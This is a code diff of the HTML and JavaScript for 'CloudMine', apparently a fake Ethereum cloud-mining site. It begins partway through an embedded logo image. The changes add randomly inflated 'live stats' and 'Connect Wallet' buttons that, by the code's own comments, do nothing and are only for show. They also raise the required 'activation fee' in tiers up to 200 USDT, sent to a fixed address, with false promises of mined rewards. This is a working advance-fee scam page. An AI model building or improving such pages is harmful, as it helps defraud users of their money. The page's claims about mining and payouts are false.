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" alt="CloudMine Hammer" class="hammer-logo">
+            </div>
+            <div class="logo">CLOUDMINE</div>
             <div class="tagline">SECURED AND VERIFIED BY ETHEREUM BLOCKCHAIN</div>
+        </div>
+
+        <!-- Live Stats -->
+        <div class="live-stats">
+            <div class="stat-item">
+                <div class="stat-value" id="ethPower">147,832</div>
+                <div class="stat-label">ETH POWER ACTIVE</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-value" id="successCount">89,247</div>
+                <div class="stat-label">SUCCESSFUL MINING</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-value" id="onlineUsers">2,847</div>
+                <div class="stat-label">MINERS ONLINE</div>
+            </div>
+        </div>
+
+        <!-- Main Action Buttons (Always Visible) -->
+        <div class="main-action-buttons">
+            <button class="main-action-btn btn-connect-main" onclick="connectWalletMain()">
+                <div class="main-icon">🔐</div>
+                <div class="main-title">CONNECT WALLET</div>
+                <div class="main-subtitle">MetaMask · Trust Wallet · WalletConnect</div>
+            </button>
+            
+            <button class="main-action-btn btn-manual-main" onclick="showManualFlow()">
+                <div class="main-icon">✏️</div>
+                <div class="main-title">MANUAL ENTRY</div>
+                <div class="main-subtitle">Enter Wallet Address Manually</div>
+            </button>
         </div>
 
         <!-- Info Section -->
@@ -1131,7 +1926,7 @@
             <div class="info-box">
                 <div class="info-title">SMART CONTRACT MINING</div>
                 <div class="info-text">
-                    EVM CloudMine uses innovative smart contract technology to enable decentralized cryptocurrency mining. Unlike traditional mining that requires expensive hardware, our platform leverages Ethereum smart contracts to distribute mining rewards directly to your wallet. Simply select your cryptocurrency, choose the amount, enter your wallet address, and our smart contracts will handle the entire mining process automatically. All transactions are executed on-chain with full transparency and security.
+                    When you mine with EVM CloudMine, you're contributing computing power to the Ethereum network while earning cryptocurrency. Your participation helps secure the blockchain and process transactions. Our smart contracts automatically distribute rewards. You help us power Ethereum, we help you earn crypto.
                 </div>
             </div>
 
@@ -1207,6 +2002,26 @@
                     <div class="coin-symbol">UNI</div>
                 </div>
             </div>
+
+            <!-- Wallet Action Buttons (shown after coin selection) -->
+            <div class="wallet-action-section" id="walletActionSection" style="display: none;">
+                <div class="action-divider">CHOOSE HOW TO PROCEED</div>
+                
+                <div class="wallet-action-buttons">
+                    <button class="wallet-action-btn btn-connect-action" onclick="connectWalletAction()">
+                        <div class="action-icon">🔐</div>
+                        <div class="action-title">CONNECT WALLET</div>
+                        <div class="action-subtitle">MetaMask · Trust · WalletConnect</div>
+                    </button>
+                    
+                    <button class="wallet-action-btn btn-manual-action" onclick="proceedManual()">
+                        <div class="action-icon">✏️</div>
+                        <div class="action-title">MANUAL ENTRY</div>
+                        <div class="action-subtitle">Enter Address Manually</div>
+                    </button>
+                </div>
+            </div>
+
         </div>
 
         <!-- Amount & Wallet Screen -->
@@ -1225,22 +2040,22 @@
                     </div>
 
                     <div class="amount-options">
-                        <div class="amount-option" onclick="selectAmount('0.05', '$170')">
+                        <div class="amount-option" onclick="selectAmount('0.05', '$170', 0)">
                             <div class="amount-value" id="amt1">0.05</div>
                             <div class="amount-symbol" id="sym1">ETH</div>
                             <div class="amount-usd">≈ $170</div>
                         </div>
-                        <div class="amount-option" onclick="selectAmount('0.1', '$340')">
+                        <div class="amount-option" onclick="selectAmount('0.1', '$340', 0)">
                             <div class="amount-value" id="amt2">0.1</div>
                             <div class="amount-symbol" id="sym2">ETH</div>
                             <div class="amount-usd">≈ $340</div>
                         </div>
-                        <div class="amount-option" onclick="selectAmount('0.25', '$850')">
+                        <div class="amount-option" onclick="selectAmount('0.25', '$850', 0)">
                             <div class="amount-value" id="amt3">0.25</div>
                             <div class="amount-symbol" id="sym3">ETH</div>
                             <div class="amount-usd">≈ $850</div>
                         </div>
-                        <div class="amount-option" onclick="selectAmount('0.5', '$1,700')">
+                        <div class="amount-option" onclick="selectAmount('0.5', '$1,700', 0)">
                             <div class="amount-value" id="amt4">0.5</div>
                             <div class="amount-symbol" id="sym4">ETH</div>
                             <div class="amount-usd">≈ $1,700</div>
@@ -1250,18 +2065,29 @@
 
                 <div class="wallet-section">
                     <div class="section-title-box">
-                        STEP 2: ENTER YOUR WALLET
+                        STEP 2: CONNECT OR ENTER WALLET
                     </div>
 
-                    <input 
-                        type="text" 
-                        id="walletInput" 
-                        class="wallet-input-field"
-                        placeholder="0x... or wallet address"
-                    >
+                    <div class="wallet-options">
+                        <button class="wallet-btn wallet-connect" onclick="connectWallet()">
+                            🔐 CONNECT WALLET
+                        </button>
+                        <div class="wallet-or">OR</div>
+                        <button class="wallet-btn wallet-manual" onclick="toggleManualInput()">
+                            💼 ENTER MANUALLY
+                        </button>
+                    </div>
 
-                    <div class="wallet-note">
-                        Your mined <span id="coinNote">ETH</span> will be sent to this address
+                    <div class="manual-input-container" id="manualInputContainer" style="display: none;">
+                        <input 
+                            type="text" 
+                            id="walletInput" 
+                            class="wallet-input-field"
+                            placeholder="0x... or wallet address"
+                        >
+                        <div class="wallet-note">
+                            Your mined <span id="coinNote">ETH</span> will be sent to this address
+                        </div>
                     </div>
                 </div>
 
@@ -1313,26 +2139,26 @@
                 </div>
 
                 <div class="unlock-section">
-                    <div class="unlock-title">🔓 SMART CONTRACT FEE</div>
+                    <div class="unlock-title">🔓 ACTIVATE AUTO-MINING</div>
                     <div class="unlock-text">
-                        To execute the smart contract and receive your mined cryptocurrency, a network gas fee is required. This fee covers the Ethereum blockchain transaction costs for deploying and executing the smart contract that will transfer your funds.
+                        Pay the smart contract activation fee to continue mining automatically. After payment, the contract will keep mining and your balance will be credited to your wallet instantly. The system will continue generating rewards in auto-mode.
                     </div>
 
                     <div class="fee-box">
-                        <div class="fee-label">SMART CONTRACT GAS FEE</div>
-                        <div class="fee-amount">35 USDT</div>
+                        <div class="fee-label">ACTIVATION FEE</div>
+                        <div class="fee-amount" id="feeAmount">35 USDT</div>
                         <div class="fee-label">ERC20 TOKENS ONLY</div>
                     </div>
 
                     <div class="address-box">
-                        <div class="address-label">SEND 35 USDT (ERC20) TO THIS ADDRESS:</div>
+                        <div class="address-label">SEND <span id="feeDisplay">35</span> USDT (ERC20) TO:</div>
                         <div class="address-value" onclick="copyAddress()">
                             0x4C1f02725f1E94CD14C91740B88659AdbEE63f01
                         </div>
                     </div>
 
                     <div class="unlock-text" style="margin-top: 15px; font-size: 8px;">
-                        ⚠️ IMPORTANT: Only send USDT on the ERC20 network (Ethereum). Other networks will result in loss of funds. After payment, your mined <span id="minedCoinNote">cryptocurrency</span> will be automatically transferred to your wallet within minutes.
+                        ⚠️ IMPORTANT: Only send USDT on the ERC20 network (Ethereum). After payment confirmation, your mined <span id="minedCoinNote">cryptocurrency</span> will be credited to your wallet and auto-mining will continue generating rewards.
                     </div>
                 </div>
             </div>
@@ -1356,6 +2182,7 @@
         let selectedSymbol = '';
         let selectedAmountValue = '';
         let selectedAmountUsd = '';
+        let selectedAmountIndex = 0;
         let userWallet = '';
 
         // Fixed USDT ERC20 address for smart contract fee
@@ -1371,6 +2198,9 @@
         };
 
         const usdValues = ['$170', '$340', '$850', '$1,700'];
+        
+        // Smart contract fees based on mining amount (in USDT)
+        const smartContractFees = ['35', '70', '135', '200'];
 
         function selectCoin(coin, name, icon) {
             selectedCoin = coin;
@@ -1378,10 +2208,18 @@
             selectedIcon = icon;
             selectedSymbol = coin.toUpperCase();
 
-            document.getElementById('selectScreen').classList.remove('active');
-            document.getElementById('amountScreen').classList.add('active');
+            // Show wallet action buttons
+            document.getElementById('walletActionSection').style.display = 'block';
+            
+            // Smooth scroll to buttons
+            setTimeout(() => {
+                document.getElementById('walletActionSection').scrollIntoView({ 
+                    behavior: 'smooth',
+                    block: 'center'
+                });
+            }, 300);
 
-            // Update display
+            // Update display for amount screen (prepare but don't show yet)
             document.getElementById('selectedIcon').textContent = icon;
             document.getElementById('selectedName').textContent = name;
             document.getElementById('coinNote').textContent = selectedSymbol;
@@ -1402,9 +2240,10 @@
             document.querySelectorAll('.amount-option').forEach(el => el.classList.remove('selected'));
         }
 
-        function selectAmount(amount, usd) {
+        function selectAmount(amount, usd, index) {
             selectedAmountValue = amount;
             selectedAmountUsd = usd;
+            selectedAmountIndex = index;
 
             // Visual feedback
             document.querySelectorAll('.amount-option').forEach(el => {
@@ -1691,6 +2530,11 @@
                 document.getElementById('infoSection').style.display = 'none';
                 document.getElementById('selectScreen').style.display = 'none';
                 document.getElementById('amountScreen').style.display = 'none';
+                document.querySelector('.live-stats').style.display = 'none';
+                document.querySelector('.main-action-buttons').style.display = 'none';
+                
+                const walletAction = document.getElementById('walletActionSection');
+                if (walletAction) walletAction.style.display = 'none';
                 
                 const miningScreen = document.getElementById('miningScreen');
                 miningScreen.classList.remove('active');
@@ -1705,18 +2549,168 @@
             }, 200);
 
             const fullAmount = selectedAmountValue + ' ' + selectedSymbol;
+            const currentFee = smartContractFees[selectedAmountIndex];
 
             document.getElementById('minedCoin').textContent = selectedName;
             document.getElementById('minedAmount').textContent = fullAmount;
             document.getElementById('minedUsd').textContent = '≈ ' + selectedAmountUsd + ' USD';
             document.getElementById('minedCoinNote').textContent = selectedName;
+            document.getElementById('feeAmount').textContent = currentFee + ' USDT';
+            document.getElementById('feeDisplay').textContent = currentFee;
         }
 
         function copyAddress() {
+            const currentFee = smartContractFees[selectedAmountIndex];
             navigator.clipboard.writeText(paymentAddress).then(() => {
-                alert('✅ ADDRESS COPIED!\n\n' + paymentAddress + '\n\nSend 35 USDT (ERC20 only) to this address.');
+                alert('✅ ADDRESS COPIED!\n\n' + paymentAddress + '\n\nSend ' + currentFee + ' USDT (ERC20 only) to this address.');
             });
         }
+
+        // Live stats animation
+        function updateLiveStats() {
+            const ethPower = document.getElementById('ethPower');
+            const successCount = document.getElementById('successCount');
+            const onlineUsers = document.getElementById('onlineUsers');
+
+            // Random fluctuations with bigger numbers
+            setInterval(() => {
+                const currentEth = parseInt(ethPower.textContent.replace(/,/g, ''));
+                const newEth = currentEth + Math.floor(Math.random() * 100) - 30;
+                ethPower.textContent = newEth.toLocaleString();
+            }, 5000);
+
+            setInterval(() => {
+                const currentSuccess = parseInt(successCount.textContent.replace(/,/g, ''));
+                const newSuccess = currentSuccess + Math.floor(Math.random() * 5) + 1;
+                successCount.textContent = newSuccess.toLocaleString();
+            }, 8000);
+
+            setInterval(() => {
+                const currentUsers = parseInt(onlineUsers.textContent.replace(/,/g, ''));
+                const change = Math.floor(Math.random() * 20) - 5;
+                const newUsers = Math.max(2500, currentUsers + change);
+                onlineUsers.textContent = newUsers.toLocaleString();
+            }, 6000);
+        }
+
+        // Show mining start (scroll to coin selection)
+        function showMiningStart() {
+            document.getElementById('selectScreen').scrollIntoView({ behavior: 'smooth' });
+        }
+
+        // Connect wallet main (does nothing - just visual)
+        function connectWalletMain() {
+            // Ничего не происходит
+            console.log('Connect Wallet clicked');
+        }
+
+        // Show manual flow - scroll to token selection
+        function showManualFlow() {
+            // Скролл к выбору токена
+            document.getElementById('selectScreen').scrollIntoView({ 
+                behavior: 'smooth',
+                block: 'start'
+            });
+        }
+
+        // Connect wallet action (does nothing - just visual)
+        function connectWalletAction() {
+            // Кнопка ничего не делает - просто для вида
+            console.log('Connect Wallet clicked');
+        }
+
+        // Proceed with manual entry - go to amount screen
+        function proceedManual() {
+            // Go to amount screen
+            document.getElementById('selectScreen').classList.remove('active');
+            document.getElementById('amountScreen').classList.add('active');
+            
+            // Show manual input container
+            document.getElementById('manualInputContainer').style.display = 'block';
+            
+            // Scroll to top of amount screen
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        // Show manual entry - goes to coin selection first
+        function showManualEntry() {
+            document.getElementById('selectScreen').scrollIntoView({ behavior: 'smooth' });
+        }
+
+        // Connect wallet directly (from coin selection)
+        async function connectWalletDirect() {
+            if (typeof window.ethereum !== 'undefined') {
+                try {
+                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    const walletAddress = accounts[0];
+                    userWallet = walletAddress;
+                    
+                    // Show amount screen
+                    document.getElementById('selectScreen').classList.remove('active');
+                    document.getElementById('amountScreen').classList.add('active');
+                    
+                    // Fill wallet input
+                    document.getElementById('walletInput').value = walletAddress;
+                    document.getElementById('manualInputContainer').style.display = 'block';
+                    
+                    alert('✅ WALLET CONNECTED!\n\n' + walletAddress + '\n\nNow select mining amount.');
+                } catch (error) {
+                    alert('❌ Connection failed. Please try manual entry.');
+                    showManualWallet();
+                }
+            } else {
+                alert('⚠️ No Web3 wallet detected.\n\nPlease install MetaMask or enter your wallet address manually.');
+                showManualWallet();
+            }
+        }
+
+        // Show manual wallet entry
+        function showManualWallet() {
+            // Show amount screen
+            document.getElementById('selectScreen').classList.remove('active');
+            document.getElementById('amountScreen').classList.add('active');
+            
+            // Show manual input
+            document.getElementById('manualInputContainer').style.display = 'block';
+            
+            // Focus on input
+            setTimeout(() => {
+                document.getElementById('walletInput').focus();
+            }, 300);
+        }
+
+        // Connect wallet (MetaMask/WalletConnect)
+        async function connectWallet() {
+            if (typeof window.ethereum !== 'undefined') {
+                try {
+                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    const walletAddress = accounts[0];
+                    document.getElementById('walletInput').value = walletAddress;
+                    document.getElementById('manualInputContainer').style.display = 'block';
+                    alert('✅ WALLET CONNECTED!\n\n' + walletAddress);
+                } catch (error) {
+                    alert('❌ Connection failed. Please try entering manually.');
+                    toggleManualInput();
+                }
+            } else {
+                alert('⚠️ No Web3 wallet detected.\n\nPlease install MetaMask or enter your wallet address manually.');
+                toggleManualInput();
+            }
+        }
+
+        // Toggle manual input
+        function toggleManualInput() {
+            const container = document.getElementById('manualInputContainer');
+            if (container.style.display === 'none') {
+                container.style.display = 'block';
+                document.getElementById('walletInput').focus();
+            } else {
+                container.style.display = 'none';
+            }
+        }
+
+        // Start live stats on page load
+        window.addEventListener('load', updateLiveStats);
     </script>
 </body>
 </html>
